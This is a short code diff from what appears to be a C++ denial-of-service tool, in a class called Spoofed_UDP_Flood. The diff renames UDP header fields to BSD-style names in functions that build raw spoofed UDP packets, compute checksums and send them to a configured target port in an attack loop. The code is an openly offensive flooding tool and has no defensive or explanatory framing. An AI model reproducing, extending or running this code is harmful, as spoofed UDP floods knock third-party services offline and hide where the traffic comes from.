@@ -62,7 +62,7 @@ void Spoofed_UDP_Flood::attack() {
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , udp , sizeof(struct udphdr) + strlen(buf));
 
-            udp->check = csum( (unsigned short*) pseudogram , psize);
+            udp->uh_sum = csum( (unsigned short*) pseudogram , psize);
 
 
             if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1) {
@@ -106,8 +106,8 @@ void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
     // UDP Struct
-    udp->source = htons(static_cast<uint16_t>(s_port));
-    udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-    udp->len = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
-    udp->check = 0;
+    udp->uh_sport = htons(static_cast<uint16_t>(s_port));
+    udp->uh_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+    udp->uh_ulen = htons(static_cast<uint16_t>(sizeof(struct udphdr)));
+    udp->uh_sum = 0;
 }
